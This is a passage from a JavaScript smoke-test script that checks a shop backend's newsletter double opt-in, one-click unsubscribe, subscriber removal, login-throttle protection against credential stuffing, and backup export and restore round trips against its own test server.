  // "Subscribed" — so typing a stranger's address into the blog footer put them
  // on a Greek shop's mailing list without their ever having asked. Nothing is
  // stored now until the person who owns the address clicks the link.
  {
    const target = `optin-${Date.now()}@example.com`;
    const sub = await fetch(`${BASE}/api/newsletter`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken,
        Cookie: `astrobaas_csrf=${csrfToken}`,
      },
      body: JSON.stringify({ email: target }),
    });
    if (sub.status === 201) ok('newsletter: a signup is accepted');
    else fail('newsletter signup', `expected 201, got ${sub.status}`);

    // THE POINT: not on the list yet.
    // The subscriber list has no API of its own; it is rendered on the admin
    // messages screen, which is where an operator sees it too.
    const readList = () => fetch(`${BASE}/admin/messages`, {
      headers: { Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}` },
    }).then((r) => r.text()).catch(() => '');
    const listBefore = await readList();
    if (!listBefore.includes(target)) {
      ok('newsletter: the address is NOT on the list before confirmation');
    } else {
      fail('newsletter double opt-in', 'the address was stored without confirmation');
    }

    // The confirmation link arrives by email, and only at that address.
    const mail = await emailReceiver.waitForMatching(
      (m) => typeof m?.to === 'string' && m.to === target, 6000,
    ).catch(() => null);
    if (mail) ok('newsletter: a confirmation email is sent to that address');
    else fail('newsletter confirmation email', 'none arrived');

    // S5.6: ONE confirmation per mailbox per day. A second signup — here under
    // another spelling of the same inbox — answers exactly the same and sends
    // nothing. Without this, any number of IPs could mail a stranger forever.
    {
      const countTo = () => emailReceiver.deliveries.filter((d) => {
        try { return JSON.parse(d.body)?.to === target; } catch { return false; }
      }).length;
      const sentBefore = countTo();
      const [localPart, domain] = target.split('@');
      const repeat = await fetch(`${BASE}/api/newsletter`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-CSRF-Token': csrfToken,
          Cookie: `astrobaas_csrf=${csrfToken}`,
        },
        body: JSON.stringify({ email: `${localPart}+again@${domain.toUpperCase()}` }),
      });
      const repeatJson = await repeat.json().catch(() => null);
      if (repeat.status === 201 && /check your email/i.test(repeatJson?.message ?? '')) {
        ok('newsletter: a repeat signup answers exactly like the first');
      } else fail('newsletter repeat answer', `status=${repeat.status} ${JSON.stringify(repeatJson)?.slice(0, 120)}`);
      await wait(1500);
      const anyNew = emailReceiver.deliveries.slice(-10).some((d) => {
        try { return /\+again@/i.test(JSON.parse(d.body)?.to ?? ''); } catch { return false; }
      });
      if (!anyNew && countTo() === sentBefore) ok('newsletter: ...and sends no second confirmation to that inbox');
      else fail('newsletter per-recipient throttle', 'a second confirmation was sent');
    }

    const link = mail && String(mail.text ?? '').match(/https?:\/\/\S*\/api\/newsletter\/confirm\?token=\S+/);
    if (link) {
      const done = await fetch(link[0], { redirect: 'manual' });
      if (done.status === 302) ok('newsletter: confirming redirects to a page, not JSON');
      else fail('newsletter confirm', `expected 302, got ${done.status}`);

      const listAfter = await readList();
      if (listAfter.includes(target)) ok('newsletter: confirming DOES add the address');
      else fail('newsletter confirm', 'the address is still not on the list');

      // A prefetching mail client opens the link before the human does. Twice
      // must not mean two rows — there is no unique index on any driver.
      //
      // Counted as a DIFFERENCE, not an absolute: the admin screen renders each
      // address more than once (as text and inside a mailto link), so the raw
      // occurrence count is not the row count. What matters is that clicking
      // again changes nothing.
      const countIn = (html) => (html.match(new RegExp(target, 'g')) || []).length;
      const once = countIn(listAfter);
      await fetch(link[0], { redirect: 'manual' });
      const twice = countIn(await readList());
      if (twice === once) ok('newsletter: confirming twice does not duplicate the row');
      else fail('newsletter idempotency', `occurrences went from ${once} to ${twice}`);

      // LEAVING. The confirmation page promises "every email has an unsubscribe
      // link", and for a while there was no way to leave and no way to remove a
      // single subscriber at all. Under GDPR withdrawing consent has to be as
      // easy as giving it; commercially, a trapped recipient's only remaining
      // option is to mark the message as spam.
      const leaveLink = `${BASE}/api/newsletter/unsubscribe?token=`
        + encodeURIComponent(new URL(link[0]).searchParams.get('token') || '');
      const wrongPurpose = await fetch(leaveLink, { redirect: 'manual' });
      const stillThere = (await readList()).includes(target);
      if (wrongPurpose.status === 302 && stillThere) {
        ok('newsletter: a CONFIRM token cannot be replayed to unsubscribe');
      } else {
        fail('newsletter token purpose', 'a confirmation token removed a subscriber');
      }

      // --- RFC 8058 ONE-CLICK: the button readers actually press ---
      //
      // Every campaign carries `List-Unsubscribe-Post: List-Unsubscribe=One-Click`,
      // which is what makes Gmail and Outlook show their own Unsubscribe control.
      // Pressing it sends a POST. The route had only a GET, so the mail client got
      // a 405, nothing was removed, and the reader's next move is the spam button —
      // which costs the shop the deliverability of its order confirmations too.
      //
      // The existing tests assert the HEADER STRING and would all still pass with
      // the POST returning 405, so this exercises the ROUTE.
      {
        const realToken = new URL(link[0]).searchParams.get('token') || '';
        // A one-click sender POSTs the header URL verbatim: token in the QUERY,
        // and only List-Unsubscribe=One-Click in the body. No cookie, no CSRF
        // header — it is mail infrastructure, not a browser.
        const oneClick = await fetch(`${BASE}/api/newsletter/unsubscribe?token=${encodeURIComponent(realToken)}`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: 'List-Unsubscribe=One-Click',
        });
        // A CONFIRM token must still not work here, whatever the verb.
        if (oneClick.status === 200) ok('newsletter: one-click POST is accepted, not 405');
        else fail('one-click unsubscribe', `POST returned ${oneClick.status} (405 = the mail client is ignored)`);
        if (!oneClick.redirected && oneClick.status < 300) {
          ok('...and answers a machine with a bare 2xx, not a redirect');
        } else fail('one-click redirect', `status=${oneClick.status} redirected=${oneClick.redirected}`);
        if ((await readList()).includes(target)) {
          ok('...while a CONFIRM token still removes nobody, even by POST');
        } else fail('one-click purpose', 'a confirmation token unsubscribed somebody via POST');

        // No token at all: still 200 (a machine cannot act on the difference,
        // and a different answer would say whether an address is on the list),
        // and still removes nothing.
        const noToken = await fetch(`${BASE}/api/newsletter/unsubscribe`, { method: 'POST' });
        if (noToken.status === 200) ok('...and a missing token gets the same 200, telling a prober nothing');
        else fail('one-click no token', `status=${noToken.status}`);
        if ((await readList()).includes(target)) ok('...having removed nothing');
        else fail('one-click no token', 'a tokenless POST removed a subscriber');
      }

      // --- the OPERATOR can remove one person, without the GDPR erasure ---
      //
      // Before this the only path that deleted a subscriber was eraseSubject,
      // which also deletes their customer record, every message they sent and
      // their email log. "Please stop emailing me" should not cost somebody
      // their order history — and /newsletter/unsubscribed explicitly invites
      // readers to reply and ask, which nobody could action.
      //
      // Prunes `target`, which THIS block confirmed: double opt-in stores
      // nothing until the link is clicked, so a fresh signup has no row to
      // remove and a test written against one would fail for the wrong reason.
      if (csrfToken) {
        const nh = {
          Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
          'X-CSRF-Token': csrfToken,
          'Content-Type': 'application/json',
        };
        // The id comes from the BUTTON on the admin screen, which also proves
        // the control is rendered and carries the right id — a route with no
        // way to reach it is the shape this whole fix is about.
        const screen = await readList();
        const btn = /<button[^>]*delete-subscriber[^>]*data-id="([^"]+)"[^>]*data-email="([^"]+)"/g;
        let subId = null;
        for (let m = btn.exec(screen); m; m = btn.exec(screen)) {
          if (m[2] === target) { subId = m[1]; break; }
        }

        if (!subId) {
          fail('subscriber prune: no Remove button for the confirmed subscriber', target);
        } else {
          ok('the admin subscriber list offers a Remove control');

          // Staff only. It takes an id, so unguarded it would let anyone
          // remove anyone.
          const anon = await fetch(`${BASE}/api/newsletter/subscribers/delete`, {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ id: subId }),
          });
          if (anon.status === 401 || anon.status === 403) ok('...and removal is staff-only');
          else fail('subscriber removal unguarded', `anonymous POST returned ${anon.status}`);

          const gone = await fetch(`${BASE}/api/newsletter/subscribers/delete`, {
            method: 'POST', headers: nh, body: JSON.stringify({ id: subId }),
          });
          if (gone.status === 200) ok('an operator can remove ONE subscriber');
          else fail('subscriber removal', `status=${gone.status}`);

          if (!(await readList()).includes(target)) ok('...and they are actually gone from the list');
          else fail('subscriber still listed', target);

          // Twice tells the operator the truth rather than a second success.
          const again = await fetch(`${BASE}/api/newsletter/subscribers/delete`, {
            method: 'POST', headers: nh, body: JSON.stringify({ id: subId }),
          });
          if (again.status === 404) ok('...and removing them again reports nothing to remove');
          else fail('subscriber double removal', `status=${again.status}`);
        }
      }
    } else {
      fail('newsletter confirm link', 'no confirmation URL in the email');
    }

    // A forged token must not enrol anyone.
    const forged = await fetch(`${BASE}/api/newsletter/confirm?token=not.a.real.token`, { redirect: 'manual' });
    if (forged.status === 302) ok('newsletter: a forged token is refused with the same redirect');
    else fail('newsletter forged token', `expected 302, got ${forged.status}`);
    const listForged = await readList();
    if (!listForged.includes('not.a.real')) ok('...and stores nothing');
    else fail('newsletter forged token', 'a forged token created a subscriber');
  }

  // ---- S3.9: one address trying many accounts ----
  //
  // LAST of everything that signs in, on purpose: once this address has spent
  // its failure budget, no sign-in from it succeeds for fifteen minutes. Every
  // email below is new, so the per address+email throttle never fires — only
  // the cross-account failure budget can refuse them.
  {
    let refusedAt = -1;
    let refusedCode = '';
    await clearOfLoginWindowBoundary(40_000);
    // 70 > the 30-failure budget plus the failures earlier blocks already spent
    // from this address, so the loop always has room to reach the refusal.
    for (let i = 0; i < 70; i += 1) {
      const r = await fetch(`${BASE}/api/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: `stuffing-${i}@example.com`, password: 'not-it' }),
      });
      if (r.status === 429) {
        refusedAt = i;
        refusedCode = (await r.json().catch(() => null))?.error?.code ?? '';
        break;
      }
    }
    // Without the budget this never happens: each fresh email has its own
    // address+email throttle, so only a cross-account counter can refuse.
    if (refusedAt >= 0 && refusedAt <= 30 && refusedCode === 'RATE_LIMITED') {
      ok(`S3.9: credential stuffing from one address is refused (after ${refusedAt} fresh emails)`);
    } else fail('S3.9 stuffing', `refusedAt=${refusedAt} code=${refusedCode}`);
    const correct = await fetch(`${BASE}/api/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: 'pow-owner@example.com', password: 'Owner#Pass1' }),
    });
    if (correct.status === 429) ok('S3.9: ...for every account, from that address');
    else fail('S3.9 stuffing scope', `a correct sign-in from the refused address got ${correct.status}`);
  }

  // ---- Backup round trip: the archive we WRITE must be one we can READ ----
  //
  // This section exists because that was not true. The scheduled off-site
  // backup writes `version: 2`; the restore route accepted `version === 1` and
  // nothing else, so every archive the scheduler had been uploading would have
  // been refused on the day it was needed — including the lowdb ones, whose
  // payload is byte-for-byte what a v1 restore already understood. Nothing said
  // so: the upload succeeded and the operations screen reported health.
  //
  // A backup you cannot restore is not a backup, so the round trip is now
  // exercised rather than assumed.
  if (sessionCookie && csrfToken) {
    const bkHeaders = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'X-CSRF-Token': csrfToken,
      'Content-Type': 'application/json',
    };
    const restore = (payload) => fetch(`${BASE}/api/backup/import`, {
      method: 'POST', headers: bkHeaders, body: JSON.stringify(payload),
    });

    const exported = await fetch(`${BASE}/api/backup/export`, { headers: bkHeaders });

    if (useLibsql) {
      // INVERTED (C-87). The download route used to be a SECOND implementation
      // that read db.json and hard-refused whenever DATABASE_URL was set — so
      // on the drivers a real deployment runs, the Download button did nothing
      // but explain itself, while the RESTORE route already understood the
      // libsql-file archive the off-site backup was writing on those very
      // installs. One half of the pair could read a format the other could not
      // write. There is one builder now.
      if (exported.status === 200) {
        ok('backup: a file-backed libSQL install CAN download its own archive');
        const kind = exported.headers.get('x-backup-kind');
        if (kind === 'libsql-file') ok('backup: and it is the libsql-file shape the restore understands');
        else fail('backup kind on libSQL', `x-backup-kind=${kind}`);
        const libArchive = await exported.json().catch(() => null);
        if (libArchive) {
          const back = await restore(libArchive);
          if (back.status === 200) ok('backup: THE ROUND TRIP — the archive it just wrote restores');
          else fail('libsql round trip', `restoring our own export returned ${back.status}`);
        }
      } else {
        fail('backup export on libSQL', `expected 200, got ${exported.status}`);
      }

      // A JSON (lowdb) archive must still be refused here: writing db.json on a
      // driver that ignores it would report a successful restore that changed
      // nothing.

      const jsonIntoLibsql = await restore({
        format: 'astrobaas-backup', version: 2, kind: 'lowdb', db: { posts: [] },
      });
      if (jsonIntoLibsql.status === 400) {
        ok('backup: a JSON archive is refused on libSQL, not silently ignored');
      } else fail('backup json into libsql', `expected 400, got ${jsonIntoLibsql.status}`);
    } else {
      const archive = exported.status === 200 ? await exported.json().catch(() => null) : null;
      if (archive?.format === 'astrobaas-backup') ok('backup: export returns an archive');
      else fail('backup export', `status ${exported.status}`);

      if (archive) {
        const back = await restore(archive);
        if (back.status === 200) ok('backup: the archive we just exported restores');
        else fail('backup round trip', `restoring our own export returned ${back.status}`);

        // THE REGRESSION. Same payload, version 2 — what the off-site scheduler
        // actually uploads. This returned 400 before the fix.
        const v2 = await restore({ ...archive, version: 2, kind: 'lowdb' });
        if (v2.status === 200) ok('backup: a version-2 archive restores (the off-site shape)');
        else fail('backup v2 rejected', `the off-site scheduler's own format returned ${v2.status}`);
      }
    }

    // A version nobody wrote is still refused, so widening the gate did not
    // turn it into "accept anything".
    const v9 = await restore({ format: 'astrobaas-backup', version: 9, db: {} });
    if (v9.status === 400) ok('backup: an unknown version is still refused');
    else fail('backup version gate', `version 9 returned ${v9.status}`);

    // A libsql-file archive is checked as a DATABASE, not as a header. The
    // genuine case — the site's own export restoring — is the round trip above.
    // This one used to be called "a real libSQL archive restores", but its bytes
    // were a 16-byte header and 512 zeros: not a database, and accepted only
    // because the old restore checked nothing past the header.
    if (useLibsql) {
      const sqlite = Buffer.concat([
        Buffer.from('SQLite format 3\u0000', 'latin1'),
        Buffer.alloc(512),
      ]);
      const real = await restore({
        format: 'astrobaas-backup', version: 2, kind: 'libsql-file',
        sqlite_base64: sqlite.toString('base64'),
        uploads: [],
      });
      // It fails `PRAGMA quick_check` (SQLITE_NOTADB), so the restore stages it,
      // checks it and refuses — where the old restore would have renamed it
      // over the live database.
      if (real.status === 400) ok('backup: an archive with a SQLite header but no database behind it is refused');
      else fail('backup libsql header-only', `expected 400, got ${real.status}`);
    }

    // A libSQL archive whose bytes are not a SQLite file must be refused rather
    // than overwriting a working database with rubbish.
    const junk = await restore({
      format: 'astrobaas-backup', version: 2, kind: 'libsql-file',
      sqlite_base64: Buffer.from('this is not a database').toString('base64'),
    });
    if (junk.status === 400) ok('backup: a libSQL archive that is not SQLite is refused');
    else fail('backup sqlite guard', `junk bytes returned ${junk.status}`);

    const anonRestore = await fetch(`${BASE}/api/backup/import`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ format: 'astrobaas-backup', version: 1, db: {} }),
    });
    if (anonRestore.status === 401 || anonRestore.status === 403) {
      ok('backup: an anonymous caller cannot restore');
    } else fail('backup auth leak', `anonymous restore returned ${anonRestore.status}`);
  }

  cleanup();
  await wait(300);
  // Remove the isolated temp DB/uploads so the smoke test leaves no artifacts.
  await fs.rm(SMOKE_DB, { force: true }).catch(() => {});
  await fs.rm(SMOKE_LIBSQL, { force: true }).catch(() => {});
  await fs.rm(SMOKE_UPLOADS, { recursive: true, force: true }).catch(() => {});

  console.log(`\n${passed} passed, ${failed} failed`);
  process.exit(failed === 0 ? 0 : 1);
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
